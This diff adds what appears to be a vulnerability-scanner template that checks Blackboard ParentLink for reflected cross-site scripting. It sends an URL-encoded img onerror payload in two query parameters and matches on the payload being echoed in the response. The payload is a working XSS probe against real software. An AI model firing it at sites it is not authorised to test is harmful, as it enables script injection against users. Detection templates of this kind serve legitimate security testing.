@@ -1,0 +1,31 @@
+id: parentlink-xss
+brief:
+    title: Blackboard - Cross-Site Scripting
+    by: r3naissance
+    level: high
+    about: Blackboard contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the att...
+    label:
+        - blackboard
+        - parentlink
+        - xss
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/main/blank?message_success=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E'
+        - '{{BaseURL}}/main/blank?message_error=%3Cimg%20src%3Dc%20onerror%3Dalert(8675309)%3E'
+      signs:
+        - "on": word
+          has:
+            - <img src=c onerror=alert(8675309)>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
